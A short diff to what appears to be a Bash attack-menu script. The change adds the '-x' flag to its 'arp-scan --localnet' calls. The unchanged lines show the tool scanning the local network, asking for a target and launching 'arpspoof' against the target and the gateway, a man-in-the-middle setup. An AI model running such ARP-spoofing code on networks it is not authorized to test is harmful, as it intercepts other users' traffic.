@@ -437,7 +437,7 @@ do
                     clear
                     echo -e "\e[1;34mScanning...\e[0m"
                     sleep 2
-                    arp-scan --localnet
+                    arp-scan --localnet -x 
                     echo -e -n "$yellow""Type your target machine : $nc"
                     read target
                     xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interafce -t $target $gateway" &
@@ -468,7 +468,7 @@ do
                     clear
                     echo -e "\e[1;34mScanning...\e[0m"
                     sleep 2
-                    arp-scan --localnet
+                    arp-scan --localnet -x 
                     
                     echo -e -n "$yellow""How many target(s)? $nc"
                     read targets
